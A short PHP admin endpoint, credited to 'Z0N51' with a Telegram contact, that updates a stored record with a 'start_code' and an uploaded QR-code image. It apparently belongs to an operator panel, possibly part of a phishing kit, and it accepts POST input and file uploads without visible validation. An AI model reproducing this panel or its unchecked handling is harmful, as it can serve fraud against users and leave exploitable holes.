<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    include_once 'inc/app.php';
    if( !is_logged() ) {
        header("location: index.php");
        exit();
    }
    
    $check = get_data('data',['id' => $_POST['rowid']]);
    if( count($check) == 0 ) {
        http_response_code(400); // Bad Request
        echo json_encode(['message' => 'No data provided']);
        exit;
    }

    if( !empty($_FILES['file']['name']) ) {
        $url     = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $x       = pathinfo($url);
        $dirname = explode('/',$x['dirname']);
        $dirname = implode('/',$dirname) . '/upload/';
        $file = upload_file($_FILES['file'],uniqid());
        if( $file !== false ) {
            $photo_link = $dirname . $file;
        } else {
            http_response_code(400); // Bad Request
            echo json_encode(['message' => 'Upload error']);
            exit;
        }
    }
    
    $data = [
        'start_code' => $_POST['start_code'],
    ];

    if( !empty($photo_link) ) {
       $data['qrcode'] = $photo_link;
    }

    $update = update_data('data',['data' => json_encode($data)],['id' => $_POST['rowid']]);
    echo json_encode(['message' => 'Updated successfully!']);
    exit;

?>
